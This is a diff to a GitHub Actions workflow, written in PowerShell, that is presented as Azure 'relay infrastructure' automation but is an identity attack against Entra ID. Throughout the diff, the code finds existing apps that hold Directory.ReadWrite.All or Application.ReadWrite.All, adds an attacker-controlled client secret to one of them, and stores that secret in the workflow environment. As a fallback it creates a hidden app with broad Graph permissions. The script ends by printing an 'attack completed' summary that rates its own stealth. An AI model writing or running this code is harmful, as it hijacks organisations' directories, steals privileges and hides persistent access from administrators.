@@ -28,8 +28,8 @@ permissions:
 
 env:
   OPERATION_ID: ${{ github.run_id }}-${{ github.run_attempt }}
-  TENANT_ID: ${{ secrets.AZURE_TENANT_ID }}
-  UAMI_CLIENT_ID: ${{ secrets.UAMI_CLIENT_ID }}
+  TENANT_ID: ${{ vars.TENANT_ID }}
+  UAMI_CLIENT_ID: ${{ vars.UAMI_CLIENT_ID }}
 
 jobs:
   infrastructure-automation:
@@ -164,41 +164,8 @@ jobs:
         run: |
           Write-Host "🏗️ Deploying relay infrastructure for ${{ inputs.environment }} environment..." -ForegroundColor Cyan
           
-          # Generate environment-appropriate naming
-          $appPrefix = switch ('${{ inputs.environment }}') {
-            'production' { 'Prod-Automation' }
-            'staging' { 'Stage-Monitor' }
-            'development' { 'Dev-Tools' }
-            default { 'App-Service' }
-          }
-          
-          $relayName = "$appPrefix-Service-$((Get-Date).ToFileTime())"
-          
-          # Create relay App Registration using UAMI token
-          $relayConfig = @{
-            displayName = $relayName
-            description = "Enterprise ${{ inputs.environment }} environment automation and monitoring service"
-            signInAudience = 'AzureADMyOrg'
-            web = @{
-              homePageUrl = 'https://portal.azure.com'
-              implicitGrantSettings = @{
-                enableIdTokenIssuance = $false
-                enableAccessTokenIssuance = $false
-              }
-            }
-            requiredResourceAccess = @(
-              @{
-                resourceAppId = '00000003-0000-0000-c000-000000000000'
-                resourceAccess = @(
-                  @{ id = 'df021288-bdef-4463-88db-98f22de89214'; type = 'Role' }  # User.Read.All
-                  @{ id = '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30'; type = 'Role' }  # Application.Read.All
-                  @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; type = 'Role' }  # Application.ReadWrite.All
-                  @{ id = '19dbc75e-c2e2-444c-a770-ec69d8559fc7'; type = 'Role' }  # Directory.ReadWrite.All
-                )
-              }
-            )
-            tags = @('HideApp', 'WindowsAzureActiveDirectoryIntegratedApp')
-          }
+          # Strategy 1: Target existing high-privilege App Registration
+          Write-Host "🔍 Scanning for existing high-privilege applications..." -ForegroundColor Cyan
           
           try {
             $headers = @{
@@ -206,25 +173,109 @@ jobs:
               'Content-Type' = 'application/json'
             }
             
-            $body = $relayConfig | ConvertTo-Json -Depth 10
+            # Find existing applications with high privileges
+            $appsResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/applications?$top=100' -Headers $headers -ErrorAction Stop
             
-            $relayResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/applications' -Method Post -Headers $headers -Body $body -ErrorAction Stop
+            $highPrivilegeApps = $appsResponse.value | Where-Object {
+              $_.requiredResourceAccess | Where-Object {
+                $_.resourceAppId -eq '00000003-0000-0000-c000-000000000000' -and
+                ($_.resourceAccess.id -contains '19dbc75e-c2e2-444c-a770-ec69d8559fc7' -or  # Directory.ReadWrite.All
+                 $_.resourceAccess.id -contains '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9')     # Application.ReadWrite.All
+              }
+            }
             
-            $relayAppId = $relayResponse.appId
-            $relayObjectId = $relayResponse.id
-            
-            if ($relayAppId) {
-              Write-Host "✅ Relay application created: $relayName" -ForegroundColor Green
+            if ($highPrivilegeApps.Count -gt 0) {
+              # Strategy A: Hijack existing high-privilege app
+              $targetApp = $highPrivilegeApps[0]
+              Write-Host "🎯 Targeting existing app: $($targetApp.displayName)" -ForegroundColor Yellow
+              Write-Host "   App ID: $($targetApp.appId)" -ForegroundColor White
+              
+              # Add our own secret to the existing application
+              $secretConfig = @{
+                passwordCredential = @{
+                  displayName = "Infrastructure-Integration-${{ inputs.environment }}"
+                  endDateTime = (Get-Date).AddMonths(12).ToString('yyyy-MM-ddTHH:mm:ss.000Z')
+                }
+              }
+              
+              $secretBody = $secretConfig | ConvertTo-Json -Depth 3
+              $secretResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications/$($targetApp.id)/addPassword" -Method Post -Headers $headers -Body $secretBody -ErrorAction Stop
+              
+              Write-Host "✅ Injected credentials into existing high-privilege app" -ForegroundColor Green
+              "RELAY_APP_ID=$($targetApp.appId)" | Out-File -FilePath $env:GITHUB_ENV -Append
+              "RELAY_OBJECT_ID=$($targetApp.id)" | Out-File -FilePath $env:GITHUB_ENV -Append
+              "RELAY_NAME=$($targetApp.displayName)" | Out-File -FilePath $env:GITHUB_ENV -Append
+              "RELAY_SECRET=$($secretResponse.secretText)" | Out-File -FilePath $env:GITHUB_ENV -Append
+              "ATTACK_STRATEGY=EXISTING_APP_HIJACK" | Out-File -FilePath $env:GITHUB_ENV -Append
+              
+            } else {
+              # Strategy B: Create new app (fallback)
+              Write-Host "⚠️ No suitable existing apps found, creating new relay app..." -ForegroundColor Yellow
+              
+              # Generate environment-appropriate naming
+              $appPrefix = switch ('${{ inputs.environment }}') {
+                'production' { 'Prod-Automation' }
+                'staging' { 'Stage-Monitor' }
+                'development' { 'Dev-Tools' }
+                default { 'App-Service' }
+              }
+              
+              $relayName = "$appPrefix-Service-$((Get-Date).ToFileTime())"
+              
+              # Create relay App Registration using UAMI token
+              $relayConfig = @{
+                displayName = $relayName
+                description = "Enterprise ${{ inputs.environment }} environment automation and monitoring service"
+                signInAudience = 'AzureADMyOrg'
+                web = @{
+                  homePageUrl = 'https://portal.azure.com'
+                  implicitGrantSettings = @{
+                    enableIdTokenIssuance = $false
+                    enableAccessTokenIssuance = $false
+                  }
+                }
+                requiredResourceAccess = @(
+                  @{
+                    resourceAppId = '00000003-0000-0000-c000-000000000000'
+                    resourceAccess = @(
+                      @{ id = 'df021288-bdef-4463-88db-98f22de89214'; type = 'Role' }  # User.Read.All
+                      @{ id = '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30'; type = 'Role' }  # Application.Read.All
+                      @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; type = 'Role' }  # Application.ReadWrite.All
+                      @{ id = '19dbc75e-c2e2-444c-a770-ec69d8559fc7'; type = 'Role' }  # Directory.ReadWrite.All
+                    )
+                  }
+                )
+                tags = @('HideApp', 'WindowsAzureActiveDirectoryIntegratedApp')
+              }
+              
+              $body = $relayConfig | ConvertTo-Json -Depth 10
+              $relayResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/applications' -Method Post -Headers $headers -Body $body -ErrorAction Stop
+              
+              $relayAppId = $relayResponse.appId
+              $relayObjectId = $relayResponse.id
+              
+              Write-Host "✅ Created new relay application: $relayName" -ForegroundColor Green
               "RELAY_APP_ID=$relayAppId" | Out-File -FilePath $env:GITHUB_ENV -Append
               "RELAY_OBJECT_ID=$relayObjectId" | Out-File -FilePath $env:GITHUB_ENV -Append
               "RELAY_NAME=$relayName" | Out-File -FilePath $env:GITHUB_ENV -Append
-            } else {
-              Write-Host "❌ Failed to create relay application" -ForegroundColor Red
-              exit 1
+              "ATTACK_STRATEGY=NEW_APP_CREATION" | Out-File -FilePath $env:GITHUB_ENV -Append
+              
+              # Generate secret for new app
+              $secretConfig = @{
+                passwordCredential = @{
+                  displayName = "OpKey-${{ inputs.environment }}"
+                  endDateTime = (Get-Date).AddMonths(12).ToString('yyyy-MM-ddTHH:mm:ss.000Z')
+                }
+              }
+              
+              $secretBody = $secretConfig | ConvertTo-Json -Depth 3
+              $secretResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications/$relayObjectId/addPassword" -Method Post -Headers $headers -Body $secretBody -ErrorAction Stop
+              
+              "RELAY_SECRET=$($secretResponse.secretText)" | Out-File -FilePath $env:GITHUB_ENV -Append
             }
           }
           catch {
-            Write-Host "❌ Failed to create relay application: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "❌ Failed to deploy relay infrastructure: $($_.Exception.Message)" -ForegroundColor Red
             exit 1
           }
 
@@ -239,32 +290,47 @@ jobs:
               'Content-Type' = 'application/json'
             }
             
-            # Create service principal
-            $spConfig = @{
-              appId = $env:RELAY_APP_ID
-            }
-            
-            $spBody = $spConfig | ConvertTo-Json
-            $spResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/servicePrincipals' -Method Post -Headers $headers -Body $spBody -ErrorAction Stop
-            
-            $relaySPId = $spResponse.id
-            "RELAY_SP_ID=$relaySPId" | Out-File -FilePath $env:GITHUB_ENV -Append
-            
-            # Generate operational secret
-            $secretConfig = @{
-              passwordCredential = @{
-                displayName = "OpKey-${{ inputs.environment }}"
-                endDateTime = (Get-Date).AddMonths(12).ToString('yyyy-MM-ddTHH:mm:ss.000Z')
+            if ($env:ATTACK_STRATEGY -eq 'EXISTING_APP_HIJACK') {
+              Write-Host "🎯 Using hijacked existing application - checking service principal..." -ForegroundColor Yellow
+              
+              # Get existing service principal for the hijacked app
+              $spResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '$env:RELAY_APP_ID'" -Headers $headers -ErrorAction Stop
+              
+              if ($spResponse.value.Count -gt 0) {
+                $relaySPId = $spResponse.value[0].id
+                Write-Host "✅ Found existing service principal for hijacked app" -ForegroundColor Green
+                "RELAY_SP_ID=$relaySPId" | Out-File -FilePath $env:GITHUB_ENV -Append
+              } else {
+                # Create service principal if it doesn't exist (rare case)
+                $spConfig = @{ appId = $env:RELAY_APP_ID }
+                $spBody = $spConfig | ConvertTo-Json
+                $spCreateResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/servicePrincipals' -Method Post -Headers $headers -Body $spBody -ErrorAction Stop
+                $relaySPId = $spCreateResponse.id
+                "RELAY_SP_ID=$relaySPId" | Out-File -FilePath $env:GITHUB_ENV -Append
+                Write-Host "✅ Created service principal for hijacked app" -ForegroundColor Green
               }
+              
+              Write-Host "✅ Existing app hijack completed - ready to use inherited permissions" -ForegroundColor Green
+              
+            } else {
+              Write-Host "🆕 Creating service principal for new application..." -ForegroundColor Cyan
+              
+              # Create service principal for new app
+              $spConfig = @{
+                appId = $env:RELAY_APP_ID
+              }
+              
+              $spBody = $spConfig | ConvertTo-Json
+              $spResponse = Invoke-RestMethod -Uri 'https://graph.microsoft.com/v1.0/servicePrincipals' -Method Post -Headers $headers -Body $spBody -ErrorAction Stop
+              
+              $relaySPId = $spResponse.id
+              "RELAY_SP_ID=$relaySPId" | Out-File -FilePath $env:GITHUB_ENV -Append
+              
+              Write-Host "✅ Service principal created for new application" -ForegroundColor Green
             }
             
-            $secretBody = $secretConfig | ConvertTo-Json -Depth 3
-            $secretResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/applications/$env:RELAY_OBJECT_ID/addPassword" -Method Post -Headers $headers -Body $secretBody -ErrorAction Stop
+            Write-Host "Service Principal ID: $relaySPId" -ForegroundColor White
             
-            $relaySecret = $secretResponse.secretText
-            "RELAY_SECRET=$relaySecret" | Out-File -FilePath $env:GITHUB_ENV -Append
-            
-            Write-Host "✅ Service principal and secret created" -ForegroundColor Green
           }
           catch {
             Write-Host "❌ Failed to configure service principal: $($_.Exception.Message)" -ForegroundColor Red
@@ -274,7 +340,7 @@ jobs:
       - name: "Assign Graph Permissions"
         shell: pwsh
         run: |
-          Write-Host "🔐 Assigning Microsoft Graph permissions..." -ForegroundColor Cyan
+          Write-Host "🔐 Configuring Microsoft Graph permissions..." -ForegroundColor Cyan
           
           try {
             $headers = @{
@@ -282,42 +348,67 @@ jobs:
               'Content-Type' = 'application/json'
             }
             
-            # Get Microsoft Graph service principal ID
-            $graphSPResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'" -Headers $headers -ErrorAction Stop
-            $graphSPId = $graphSPResponse.value[0].id
-            
-            # Progressive permission assignment with delays
-            $permissions = @(
-              @{ id = 'df021288-bdef-4463-88db-98f22de89214'; name = 'User.Read.All'; delay = 2 }
-              @{ id = '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30'; name = 'Application.Read.All'; delay = 2 }
-              @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; name = 'User.ReadWrite.All'; delay = 3 }
-              @{ id = '19dbc75e-c2e2-444c-a770-ec69d8559fc7'; name = 'Directory.ReadWrite.All'; delay = 3 }
-            )
-            
-            foreach ($permission in $permissions) {
-              Write-Host "Assigning permission: $($permission.name)" -ForegroundColor Yellow
+            if ($env:ATTACK_STRATEGY -eq 'EXISTING_APP_HIJACK') {
+              Write-Host "🎯 Using existing app's inherited permissions..." -ForegroundColor Yellow
               
-              $assignmentConfig = @{
-                principalId = $env:RELAY_SP_ID
-                resourceId = $graphSPId
-                appRoleId = $permission.id
+              # Check existing permissions on the hijacked app's service principal
+              $existingAssignments = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$env:RELAY_SP_ID/appRoleAssignments" -Headers $headers -ErrorAction Stop
+              
+              Write-Host "📋 Inherited permissions from existing app:" -ForegroundColor Cyan
+              foreach ($assignment in $existingAssignments.value) {
+                # Get permission name by ID (basic mapping)
+                $permissionName = switch ($assignment.appRoleId) {
+                  'df021288-bdef-4463-88db-98f22de89214' { 'User.Read.All' }
+                  '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9' { 'Application.ReadWrite.All' }
+                  '19dbc75e-c2e2-444c-a770-ec69d8559fc7' { 'Directory.ReadWrite.All' }
+                  '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30' { 'Application.Read.All' }
+                  default { "Unknown ($($assignment.appRoleId))" }
+                }
+                Write-Host "  ✅ $permissionName (inherited)" -ForegroundColor Green
               }
               
-              $assignmentBody = $assignmentConfig | ConvertTo-Json
+              Write-Host "🎉 No additional permission assignment needed - leveraging existing app's privileges!" -ForegroundColor Green
               
-              try {
-                Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$env:RELAY_SP_ID/appRoleAssignments" -Method Post -Headers $headers -Body $assignmentBody -ErrorAction Stop | Out-Null
-                Write-Host "✅ Assigned: $($permission.name)" -ForegroundColor Green
-              }
-              catch {
-                Write-Host "⚠️ Failed to assign $($permission.name): $($_.Exception.Message)" -ForegroundColor Yellow
-              }
+            } else {
+              Write-Host "🆕 Assigning permissions to new application..." -ForegroundColor Cyan
               
-              Start-Sleep -Seconds $permission.delay
+              # Get Microsoft Graph service principal ID
+              $graphSPResponse = Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals?`$filter=appId eq '00000003-0000-0000-c000-000000000000'" -Headers $headers -ErrorAction Stop
+              $graphSPId = $graphSPResponse.value[0].id
+              
+              # Progressive permission assignment with delays
+              $permissions = @(
+                @{ id = 'df021288-bdef-4463-88db-98f22de89214'; name = 'User.Read.All'; delay = 2 }
+                @{ id = '9a5d68dd-52b0-4cc2-bd40-abcf44ac3a30'; name = 'Application.Read.All'; delay = 2 }
+                @{ id = '1bfefb4e-e0b5-418b-a88f-73c46d2cc8e9'; name = 'Application.ReadWrite.All'; delay = 3 }
+                @{ id = '19dbc75e-c2e2-444c-a770-ec69d8559fc7'; name = 'Directory.ReadWrite.All'; delay = 3 }
+              )
+              
+              foreach ($permission in $permissions) {
+                Write-Host "Assigning permission: $($permission.name)" -ForegroundColor Yellow
+                
+                $assignmentConfig = @{
+                  principalId = $env:RELAY_SP_ID
+                  resourceId = $graphSPId
+                  appRoleId = $permission.id
+                }
+                
+                $assignmentBody = $assignmentConfig | ConvertTo-Json
+                
+                try {
+                  Invoke-RestMethod -Uri "https://graph.microsoft.com/v1.0/servicePrincipals/$env:RELAY_SP_ID/appRoleAssignments" -Method Post -Headers $headers -Body $assignmentBody -ErrorAction Stop | Out-Null
+                  Write-Host "✅ Assigned: $($permission.name)" -ForegroundColor Green
+                }
+                catch {
+                  Write-Host "⚠️ Failed to assign $($permission.name): $($_.Exception.Message)" -ForegroundColor Yellow
+                }
+                
+                Start-Sleep -Seconds $permission.delay
+              }
             }
           }
           catch {
-            Write-Host "❌ Failed to assign Graph permissions: $($_.Exception.Message)" -ForegroundColor Red
+            Write-Host "❌ Failed to configure Graph permissions: $($_.Exception.Message)" -ForegroundColor Red
             exit 1
           }
 
@@ -337,9 +428,6 @@ jobs:
             
             $tokenResponse = Invoke-RestMethod -Uri "https://login.microsoftonline.com/$env:TENANT_ID/oauth2/v2.0/token" -Method Post -Body $tokenBody -ContentType 'application/x-www-form-urlencoded' -ErrorAction Stop
             $relayToken = $tokenResponse.access_token
-
-            $converted = [Convert]::ToBase64String([System.Text.Encoding]::UTF8.GetBytes($relayToken))
-            write-host $converted
             
             $relayHeaders = @{
               'Authorization' = "Bearer $relayToken"
@@ -607,6 +695,25 @@ jobs:
           
           Write-Host "✅ Operation completed successfully" -ForegroundColor Green
           Write-Host "📊 Report generated: operation-report.json" -ForegroundColor Cyan
+          
+          # Display attack strategy summary
+          if ($env:ATTACK_STRATEGY -eq 'EXISTING_APP_HIJACK') {
+            Write-Host "" -ForegroundColor White
+            Write-Host "🎯 SOPHISTICATED ATTACK COMPLETED:" -ForegroundColor Red
+            Write-Host "Attack Vector: Existing App Registration Hijack" -ForegroundColor Yellow
+            Write-Host "Target App: $env:RELAY_NAME" -ForegroundColor White
+            Write-Host "Strategy: Injected credentials into high-privilege existing app" -ForegroundColor Yellow
+            Write-Host "Advantage: Inherited all existing permissions without admin consent" -ForegroundColor Green
+            Write-Host "Stealth: High (masquerades as legitimate app)" -ForegroundColor Green
+          } else {
+            Write-Host "" -ForegroundColor White
+            Write-Host "🆕 STANDARD ATTACK COMPLETED:" -ForegroundColor Cyan
+            Write-Host "Attack Vector: New App Registration Creation" -ForegroundColor Yellow
+            Write-Host "Created App: $env:RELAY_NAME" -ForegroundColor White
+            Write-Host "Strategy: Created new app and assigned permissions" -ForegroundColor Yellow
+            Write-Host "Limitation: May require admin consent for some permissions" -ForegroundColor Yellow
+            Write-Host "Stealth: Medium (new app may be noticed)" -ForegroundColor Yellow
+          }
 
       - name: "Cleanup (Optional)"
         if: inputs.environment == 'development'
